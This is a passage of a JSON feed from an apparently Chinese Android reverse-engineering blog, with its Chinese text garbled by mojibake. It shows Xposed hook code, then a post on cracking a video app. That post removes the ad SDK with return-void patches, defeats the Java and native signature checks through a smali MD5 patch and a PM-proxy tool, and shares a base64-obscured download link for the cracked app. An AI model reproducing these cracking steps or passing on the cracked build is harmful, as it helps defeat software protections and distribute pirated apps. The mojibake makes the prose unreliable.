&#123;</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                super.beforeHookedMethod (param);</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                Log.d (\"zj2595\",param.args [0].toString ());</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                XposedBridge.log (param.args [0].toString ());</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                String a = \"pt å˜¿å˜¿å˜¿å‚æ•°ä¿®æ”¹æˆåŠŸ\";</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                param.args [0] = a;</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                Log.d (\"zj2595\",param.args [0].toString ());</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            &#125;</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            @Override</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            protected void afterHookedMethod (MethodHookParam param) throws Throwable &#123;</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>                super.afterHookedMethod (param);</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>                Log.d (\"zj2595\",param.getResult ().toString ());</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                param.setResult (\"è¿”å›å€¼ä¿®æ”¹æˆåŠŸå“‡å“ˆå“ˆ\");</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            &#125;</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        &#125;);*/</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>       <span class=\"token comment\">/* Class a = loadPackageParam.classLoader.loadClass(\"com.zj.wuaipojie.Demo\");</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        XposedBridge.hookAllMethods(a, \"complexParameterFunc\", new XC_MethodHook() &#123;</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>            @Override</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            protected void beforeHookedMethod(MethodHookParam param) throws Throwable &#123;</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>                super.beforeHookedMethod(param);</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>                Log.d(\"zj2595\",param.args[0].toString());</pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            &#125;</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        &#125;);*/</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token comment\">/*Class a = loadPackageParam.classLoader.loadClass (\"com.zj.wuaipojie.Demo\");</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        XposedBridge.hookAllMethods (a,\"repleaceFunc\",new XC_MethodReplacement () &#123;</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>            @Override</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>            protected Object replaceHookedMethod (MethodHookParam methodHookParam) throws Throwable &#123;</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>                return \"\";// å¯ç”¨äºå»å¼¹çª—</pre></td></tr><tr><td data-num=\"51\"></td><td><pre>            &#125;</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        &#125;);*/</pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token class-name\">XposedHelpers</span><span class=\"token punctuation\">.</span><span class=\"token function\">findAndHookMethod</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Application</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"attach\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Context</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">XC_MethodHook</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>            <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>            <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">afterHookedMethod</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">MethodHookParam</span> param<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Throwable</span> <span class=\"token punctuation\">&#123;</span><span class=\"token comment\">// å›è°ƒå‡½æ•°</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>                <span class=\"token class-name\">Context</span> context <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Context</span><span class=\"token punctuation\">)</span> param<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>                <span class=\"token class-name\">ClassLoader</span> classLoader <span class=\"token operator\">=</span> context<span class=\"token punctuation\">.</span><span class=\"token function\">getClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>                <span class=\"token class-name\">XposedHelpers</span><span class=\"token punctuation\">.</span><span class=\"token function\">findAndHookMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"com.zj.wuaipojie.Demo\"</span><span class=\"token punctuation\">,</span> loadPackageParam<span class=\"token punctuation\">.</span>classLoader<span class=\"token punctuation\">,</span> <span class=\"token string\">\"a\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">XC_MethodHook</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span><span class=\"token comment\">// è¦æ ¹æ®å®é™…ä¼ å…¥å‚æ•°çš„ç±»å‹</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>            <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>            <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">beforeHookedMethod</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">MethodHookParam</span> param<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Throwable</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>                <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">beforeHookedMethod</span><span class=\"token punctuation\">(</span>param<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>                <span class=\"token class-name\">Log</span><span class=\"token punctuation\">.</span><span class=\"token function\">d</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"zj2595\"</span><span class=\"token punctuation\">,</span>param<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>                <span class=\"token class-name\">XposedBridge</span><span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>param<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>                <span class=\"token class-name\">String</span> a <span class=\"token operator\">=</span> <span class=\"token string\">\"ptå˜¿å˜¿å˜¿å‚æ•°ä¿®æ”¹æˆåŠŸ\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>                param<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>                <span class=\"token class-name\">Log</span><span class=\"token punctuation\">.</span><span class=\"token function\">d</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"zj2595\"</span><span class=\"token punctuation\">,</span>param<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>            <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>            <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">afterHookedMethod</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">MethodHookParam</span> param<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Throwable</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>                <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">afterHookedMethod</span><span class=\"token punctuation\">(</span>param<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>                <span class=\"token class-name\">Log</span><span class=\"token punctuation\">.</span><span class=\"token function\">d</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"zj2595\"</span><span class=\"token punctuation\">,</span>param<span class=\"token punctuation\">.</span><span class=\"token function\">getResult</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>                param<span class=\"token punctuation\">.</span><span class=\"token function\">setResult</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"è¿”å›å€¼ä¿®æ”¹æˆåŠŸå“‡å“ˆå“ˆ\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>                <span class=\"token comment\">//hook é€»è¾‘åœ¨è¿™é‡Œé¢å†™</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre></pre></td></tr><tr><td data-num=\"79\"></td><td><pre></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "ç¬”è®°"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/09/08/%E6%9B%B4%E6%96%B0%E5%90%8E%E6%9F%90%E7%94%B5%E8%A7%86%E9%A2%91APP%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%A0%B4%E8%A7%A3/",
            "url": "https://3cly.github.io/2023/09/08/%E6%9B%B4%E6%96%B0%E5%90%8E%E6%9F%90%E7%94%B5%E8%A7%86%E9%A2%91APP%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%A0%B4%E8%A7%A3/",
            "title": "æ›´æ–°åæŸç”µè§†é¢‘APPå»å¹¿å‘Šç ´è§£",
            "date_published": "2023-09-08T07:21:05.000Z",
            "content_html": "<h1 id=\"æ›´æ–°åæŸç”µè§†é¢‘appå»å¹¿å‘Šç ´è§£\"><a class=\"markdownIt-Anchor\" href=\"#æ›´æ–°åæŸç”µè§†é¢‘appå»å¹¿å‘Šç ´è§£\">#</a> æ›´æ–°åæŸç”µè§†é¢‘ APP å»å¹¿å‘Šç ´è§£</h1>\n<p>å‚è€ƒ 52pj å¤§ä½¬æ•™ç¨‹:<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuNTJwb2ppZS5jbi90aHJlYWQtMTgxNDkxNy0xLTEuaHRtbA==\">https://www.52pojie.cn/thread-1814917-1-1.html</span></p>\n<p>æ•™ç¨‹ä¸­æ ·æœ¬è½¯ä»¶ç‰ˆæœ¬æ˜¯ 1.5.1, æœ¬åšå®¢åŸºäºæ›´æ–°åçš„ç‰ˆæœ¬ 1.6.1 éƒ¨åˆ†æ“ä½œä¸ä¸€æ · å¤§è‡´æ€è·¯ä¸€æ ·çš„</p>\n<p>æ¯”è¾ƒé€†å¤©çš„å°±æ˜¯çœŸæœºå¯åŠ¨é—ªé€€ åªå¥½ç”¨æ¨¡æ‹Ÿå™¨äº†</p>\n<h2 id=\"ç ´è§£æ€è·¯\"><a class=\"markdownIt-Anchor\" href=\"#ç ´è§£æ€è·¯\">#</a> ç ´è§£æ€è·¯</h2>\n<p>æƒ³åœ¨ APP å…è´¹çœ‹ç‰‡ï¼Œæœ‰ä¸¤ç§è·¯å¾„ ä¸€ç§æ˜¯çœ‹å¹¿å‘Šï¼Œä¸€ç§æ˜¯é‚€è¯·äººæ•°ä¹Ÿå°±æ˜¯æ¨å¹¿ï¼Œè¿™é‡Œç”¨çš„æ˜¯é€šè¿‡å»å¹¿å‘Šçš„æ–¹æ³•å®ç°å…è´¹çœ‹ç‰‡</p>\n<h2 id=\"å¹¿å‘Šåˆ†æ\"><a class=\"markdownIt-Anchor\" href=\"#å¹¿å‘Šåˆ†æ\">#</a> å¹¿å‘Šåˆ†æ</h2>\n<p>è®¸å¤šå¹¿å‘Šçš„ SDK æ–‡æ¡£ç™¾åº¦èƒ½æœ å°±ä¸åˆ—ä¸¾äº†</p>\n<p><img data-src=\"/images/image-20230907135215523.png\" alt=\"image-20230907135215523\"></p>\n<p>jadx ä¸€å¼€å°±èƒ½çœ‹è§ä¸€å †å¹¿å‘Šç›¸å…³</p>\n<h3 id=\"å»å¹¿å‘Š\"><a class=\"markdownIt-Anchor\" href=\"#å»å¹¿å‘Š\">#</a> å»å¹¿å‘Š</h3>\n<p>å¹¿å‘Š SDK å°‘çš„è¯ å°±ç›´æ¥åœ¨æ–‡æ¡£é‡Œæ‰¾å…³é”®çš„æ–¹æ³• æ”¹è¿”å›å€¼å³å¯</p>\n<p>è¿™ä¸ªè½¯ä»¶å°±æ˜¯å¹¿å‘Šæ¯”è¾ƒå¤šçš„</p>\n<p>å…³é”®å­—:initsdkã€loadadã€initad ç­‰</p>\n<p>SDK çš„åˆå§‹åŒ–åŸºæœ¬ä¸Šéƒ½åœ¨å¯åŠ¨ç±»</p>\n<p><img data-src=\"/images/image-20230907141405616.png\" alt=\"image-20230907141405616\"></p>\n<p>activity æ´»åŠ¨è®°å½•å…ˆ</p>\n<p><img data-src=\"/images/image-20230907141549356.png\" alt=\"image-20230907141549356\"></p>\n<p><img data-src=\"/images/image-20230907143037411.png\" alt=\"image-20230907143037411\"></p>\n<p><img data-src=\"/images/image-20230907143226970.png\" alt=\"image-20230907143226970\"></p>\n<p>æŸ¥æ‰¾ç”¨ä¾‹å¯ä»¥å‘ç°è¿™é‡Œ  è¿™äº›ä¸€ç³»åˆ—æ–¹æ³•éƒ½æ˜¯ SDK çš„åˆå§‹åŒ–  å› ä¸ºæ˜¯ void æ–¹æ³•äºæ˜¯æŠŠè¿™ä¸ª d æ–¹æ³•ä¸­é—´çš„ä»£ç éƒ½åˆ äº†å³å¯ (æˆ–åŠ ä¸€ä¸ª return-void)</p>\n<p><img data-src=\"/images/image-20230907145107792.png\" alt=\"image-20230907145107792\"></p>\n<p>VIP å…å¹¿å‘Š</p>\n<p><img data-src=\"/images/image-20230907172042361.png\" alt=\"image-20230907172042361\"></p>\n<p>å…³é”®æ–¹æ³•:getFree_time ()</p>\n<h3 id=\"å»é™¤ç­¾åæ ¡éªŒ\"><a class=\"markdownIt-Anchor\" href=\"#å»é™¤ç­¾åæ ¡éªŒ\">#</a> å»é™¤ç­¾åæ ¡éªŒ</h3>\n<p>(æ²¡ç®¡ç­¾åæ ¡éªŒå°±ç”¨ç®—æ³•åŠ©æ‰‹ç›´æ¥ hook)</p>\n<h4 id=\"æ³•ä¸€ç®€å•æ³¨é‡Šæ‰exitçš„åœ°æ–¹hook\"><a class=\"markdownIt-Anchor\" href=\"#æ³•ä¸€ç®€å•æ³¨é‡Šæ‰exitçš„åœ°æ–¹hook\">#</a> æ³•ä¸€ (ç®€å•): æ³¨é‡Šæ‰ exit çš„åœ°æ–¹ (hook)</h4>\n<p>ç›´æ¥æœ app kill å³å¯æ‰¾åˆ°ä¸‰ä¸ªé€€å‡ºçš„åœ°æ–¹</p>\n<h4 id=\"æ³•äºŒæ‰‹æ’•æ‰¾åˆ°éªŒè¯md5æ‘˜è¦çš„åœ°æ–¹åœ¨smailä»£ç è¿›è¡Œä¸€ä¸ªæ–¹æ³•é‡å†™è®©ä»–å¾—åˆ°çš„å­—ç¬¦ä¸²ä¸æ ¡éªŒæ‰€éœ€çš„md5å€¼ä¸€æ ·\"><a class=\"markdownIt-Anchor\" href=\"#æ³•äºŒæ‰‹æ’•æ‰¾åˆ°éªŒè¯md5æ‘˜è¦çš„åœ°æ–¹åœ¨smailä»£ç è¿›è¡Œä¸€ä¸ªæ–¹æ³•é‡å†™è®©ä»–å¾—åˆ°çš„å­—ç¬¦ä¸²ä¸æ ¡éªŒæ‰€éœ€çš„md5å€¼ä¸€æ ·\">#</a> æ³•äºŒ (æ‰‹æ’•ï¼): æ‰¾åˆ°éªŒè¯ MD5 æ‘˜è¦çš„åœ°æ–¹ï¼Œåœ¨ smail ä»£ç è¿›è¡Œä¸€ä¸ªæ–¹æ³•é‡å†™è®©ä»–å¾—åˆ°çš„å­—ç¬¦ä¸²ä¸æ ¡éªŒæ‰€éœ€çš„ MD5 å€¼ä¸€æ ·</h4>\n<p><img data-src=\"/images/image-20230907192124173.png\" alt=\"image-20230907192124173\"></p>\n<p>if åˆ¤æ–­æ‰¾åˆ° obj å‚æ•°å’Œ saiFunUtils.f8000c å‚æ•°ï¼Œåè€…æ˜¯ app_id æŸ¥æ‰¾åå°±æ˜¯ zidian</p>\n<p>equals çš„å€¼æ˜¯<img data-src=\"/images/image-20230907192701068.png\" alt=\"image-20230907192701068\"></p>\n<p><img data-src=\"/images/image-20230907192956888.png\" alt=\"image-20230907192956888\"></p>\n<p><strong>13AB01332853FA65AD5C3BA49950A45C</strong>  32 ä½å­—ç¬¦ä¸² çŒœæµ‹ä¸º MD5 æ‘˜è¦</p>\n<p><img data-src=\"/images/image-20230907193215342.png\" alt=\"image-20230907193215342\"></p>\n<p>æ‰¾åˆ°è¿™ä¸ªç¬¬ä¸€ä¸ªå‚æ•°çš„æ–¹æ³•ï¼Œçœ‹åˆ° getPackageName () æ–¹æ³• (å¤šåŠå°±æ¶‰åŠåˆ°ç­¾åä¿¡æ¯äº†)</p>\n<p><img data-src=\"/images/image-20230907194544672.png\" alt=\"image-20230907194544672\"></p>\n<p>ç»§ç»­ ctrl + é¼ æ ‡å·¦é”®å¯»æ‰¾åˆ°è¿™é‡Œæœ‰ signature çš„ f æ–¹æ³•</p>\n<p>ç»“åˆä¸Šè¿°ä»¥åŠç®—æ³•åŠ©æ‰‹ hook æ‰“å° f æ–¹æ³•æ—¥å¿— å¯ä»¥å¾—çŸ¥è¿™ä¸ª w æ–¹æ³•å°±æ˜¯è·å–åŒ…çš„ MD5 æ‘˜è¦å†å’Œä½ çš„å¯¹æ¯”</p>\n<p>äºæ˜¯ MT ç®¡ç†å™¨ä¿®æ”¹ f æ–¹æ³•çš„ smail ä»£ç </p>\n<pre><code>.method public static f()Ljava/util/List;\n    .registers 2\n    .annotation build Landroidx/annotation/NonNull;\n    .end annotation\n\n    .annotation system Ldalvik/annotation/Signature;\n        value = &#123;\n            &quot;()&quot;,\n            &quot;Ljava/util/List&lt;&quot;,\n            &quot;Ljava/lang/String;&quot;,\n            &quot;&gt;;&quot;\n        &#125;\n    .end annotation\n\n    .line 1\n    new-instance v0, Ljava/util/ArrayList;\n\n    invoke-direct &#123;v0&#125;, Ljava/util/ArrayList;-&gt;&lt;init&gt;()V\n\n    const-string v1, &quot;F9:6C:E9:5F:D5:47:BE:DF:81:15:E3:71:8A:10:54:45&quot; \n    #åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ ArrayList å®ä¾‹ï¼Œç„¶åå‘åˆ—è¡¨ä¸­æ·»åŠ äº†ä¸€ä¸ªå­—ç¬¦ä¸²å¸¸é‡ &quot;F9:6C:E9:5F:D5:47:BE:DF:81:15:E3:71:8A:10:54:45&quot;\n\n    invoke-virtual &#123;v0, v1&#125;, Ljava/util/ArrayList;-&gt;add(Ljava/lang/Object;)Z\n\n    return-object v0\n.end method\n\n</code></pre>\n<h5 id=\"å¤§å‘\"><a class=\"markdownIt-Anchor\" href=\"#å¤§å‘\">#</a> å¤§å‘</h5>\n<p>ç»è¿‡å¤§ä½¬çš„åˆ†æï¼Œè¯¥ APP çš„ç­¾åæ ¡éªŒåˆ†ä¸º java å±‚å’Œ native å±‚ (åå°„è·å–ç­¾åä¿¡æ¯), æ”¹ MD5 åªé€šè¿‡äº† java å±‚ï¼Œä»ç„¶ä¼šæ’­æ”¾å¤±è´¥ï¼(åå°„ä»‹ç»:<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC82Mjc3YzFmOWY0OGQ=\">https://www.jianshu.com/p/6277c1f9f48d</span>)</p>\n<p><img data-src=\"/images/image-20230907190446500.png\" alt=\"image-20230907190446500\"></p>\n<p>æ‰€æœ‰å¯¼å‡ºå‡½æ•°å·²è¢«æ··æ·† (çŸ¥è¯†è¡¥å……:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2psdHhnY3kvYXJ0aWNsZS9kZXRhaWxzLzEwOTAxMjAwNg==\">https://blog.csdn.net/jltxgcy/article/details/109012006</span>)</p>\n<p><img data-src=\"/images/image-20230907190901893.png\" alt=\"image-20230907190901893\"></p>\n<p>JNI ä¹Ÿè¢«æ”¹è¿‡ æ•… so æ–‡ä»¶åˆ†æå›°éš¾</p>\n<p>å¤§ä½¬çš„è¯æ˜¯è¯´é€šè¿‡å…¶ä»–çš„ä¸€äº›å·¥å…·åˆ†æå‡ºè¿™ä¸ª so å…¶å®æ˜¯é€šè¿‡åå°„æ¥è·å–ç­¾åçš„ä¿¡æ¯ (b ç«™é—®äº†å¤§ä½¬å¤§ä½¬è¯´å…¶ä»–å·¥å…·æ˜¯æŒ‡ funelf,github ä¸Šä¸€æœå°±æœ‰)</p>\n<p><img data-src=\"/images/image-20230907191521875.png\" alt=\"image-20230907191521875\"></p>\n<p>åˆ†ææ—¥å¿—å¯çŸ¥å¯ä»¥é€šè¿‡ PM ä»£ç†çš„æ–¹æ³•ä»£ç†å®ƒçš„ç­¾åä¿¡æ¯</p>\n<p>æ‰‹åŠ¨ç”¨ PM ä»£ç†æ˜¯ä¸ä¼šçš„ï¼Œå¯ä»¥ç”¨ MT ç®¡ç†å™¨è‡ªå¸¦çš„å»é™¤ç­¾åæ ¡éªŒåŠŸèƒ½ (åŸç†å…¶å®å°±æ˜¯ PM ä»£ç†)</p>\n<h5 id=\"é—ªé€€é—®é¢˜\"><a class=\"markdownIt-Anchor\" href=\"#é—ªé€€é—®é¢˜\">#</a> é—ªé€€é—®é¢˜</h5>\n<p>ä¸€å¼€å§‹å°±è¦å»ç­¾åæ ¡éªŒï¼Œç„¶åæ‰èƒ½æ”¹åŒ…ï¼</p>\n<h3 id=\"æˆåŠŸå¹¿å‘Šä¸€å»å¯ä»¥çœ‹å¥¥æœ¬æµ·é»˜äº†\"><a class=\"markdownIt-Anchor\" href=\"#æˆåŠŸå¹¿å‘Šä¸€å»å¯ä»¥çœ‹å¥¥æœ¬æµ·é»˜äº†\">#</a> æˆåŠŸï¼å¹¿å‘Šä¸€å»ï¼Œå¯ä»¥çœ‹å¥¥æœ¬æµ·é»˜äº†ï¼</h3>\n<p><img data-src=\"/images/image-20230907204120189.png\" alt=\"image-20230907204120189\"></p>\n<p>å¸ƒå±€ä¼˜åŒ–ä»€ä¹ˆçš„è¿˜æ²¡æï¼Œç›´æ¥ç‚¹è§‚çœ‹å¹¿å‘Š æ˜¯ä¸ä¼šå¼¹å¹¿å‘Šçš„ å°±æ˜¯åœ¨å¹¿å‘Š SDK åˆå§‹åŒ–çš„æ—¶å€™è®©ä»–ç›´æ¥ return-void äº†ï¼Œå…³é”®è¿˜æ˜¯ç­¾åæ ¡éªŒéƒ¨åˆ†å§</p>\n<p>è¿™é‡ŒæŒ‚ä¸€ä¸ªç™¾åº¦ç½‘ç›˜é“¾æ¥ï¼Œéœ€è¦å°±ç›´æ¥ä¸‹è½½å§</p>\n<p>6ZO+5o6l77yaaHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMWNjNW10Z3Q4eWdaVkduVmlsZXB4YWc/cHdkPXl2eGUgCuaPkOWPluegge+8mnl2eGUgCi0t5p2l6Ieq55m+5bqm572R55uY6LaF57qn5Lya5ZGYVjXnmoTliIbkuqs=</p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "ç¬”è®°"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/07/30/andriodlabs-%E6%9B%B4%E6%96%B0%E4%B8%AD/",
            "url": "https://3cly.github.io/2023/07/30/andriodlabs-%E6%9B%B4%E6%96%B0%E4%B8%AD/",
            "title": "andriodlabs_æ›´æ–°ä¸­",
            "date_published": "2023-07-30T15:34:38.000Z",
            "content_html": "<h1 id=\"andriodlabs\"><a class=\"markdownIt-Anchor\" href=\"#andriodlabs\">#</a> andriodlabs</h1>\n<p>ä¹‹å‰æ‰‹è´±åˆæ›´æ–°åˆ°å®‰å“ 13 äº† åˆéœ€è¦é‡æ–°åˆ·ä¸€æ¬¡æœº å¿ƒç´¯</p>\n<p><img data-src=\"/images/image-20230712124358034.png\" alt=\"image-20230712124358034\"></p>\n<p>è®°ä½ frida-server åœ¨ /data/local/tmp/</p>\n<p>æœ‰å…³ jar åŒ…:<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC84MjMyMDQ5Mg==\">https://zhuanlan.zhihu.com/p/82320492</span></p>\n<h2 id=\"å®‰å“æ¶æ„\"><a class=\"markdownIt-Anchor\" href=\"#å®‰å“æ¶æ„\">#</a> å®‰å“æ¶æ„</h2>\n<p>Android æ˜¯ä¸€ä¸ªå¼€æºçš„ï¼ŒåŸºäº Linux çš„ç§»åŠ¨è®¾å¤‡æ“ä½œç³»ç»Ÿ</p>\n<p>åº”ç”¨ç¨‹åºç»„ä»¶æ˜¯ä¸€ä¸ª Android åº”ç”¨ç¨‹åºçš„åŸºæœ¬æ„å»ºå—ã€‚è¿™äº›ç»„ä»¶ç”±åº”ç”¨æ¸…å•æ–‡ä»¶æ¾è€¦åˆçš„ç»„ç»‡ã€‚AndroidManifest.xml æè¿°äº†åº”ç”¨ç¨‹åºçš„æ¯ä¸ªç»„ä»¶ï¼Œä»¥åŠä»–ä»¬å¦‚ä½•äº¤äº’ã€‚</p>\n<p>ä»¥ä¸‹æ˜¯å¯ä»¥åœ¨ Android åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨çš„å››ä¸ªä¸»è¦ç»„ä»¶ã€‚</p>\n<table>\n<thead>\n<tr>\n<th>ç»„ä»¶</th>\n<th>æè¿°</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Activities (æ´»åŠ¨)</td>\n<td>æè¿° UIï¼Œå¹¶ä¸”å¤„ç†ç”¨æˆ·ä¸æœºå™¨å±å¹•çš„äº¤äº’ã€‚</td>\n</tr>\n<tr>\n<td>Services (æœåŠ¡)</td>\n<td>å¤„ç†ä¸åº”ç”¨ç¨‹åºå…³è”çš„åå°æ“ä½œã€‚</td>\n</tr>\n<tr>\n<td>Broadcast Receivers (å¹¿æ’­æ¥æ”¶å™¨)</td>\n<td>å¤„ç† Android æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºä¹‹é—´çš„é€šä¿¡ã€‚</td>\n</tr>\n<tr>\n<td>Content Providers (å†…å®¹æä¾›è€…)</td>\n<td>å¤„ç†æ•°æ®å’Œæ•°æ®åº“ç®¡ç†æ–¹é¢çš„é—®é¢˜ã€‚</td>\n</tr>\n</tbody>\n</table>\n<p>Android çš„åˆ† 4 å±‚ï¼Œjava åº”ç”¨ç¨‹åºï¼Œjava æ¡†æ¶ï¼Œæœ¬åœ°æ¡†æ¶å’Œ java è¿è¡Œç¯å¢ƒï¼ŒLinux å†…æ 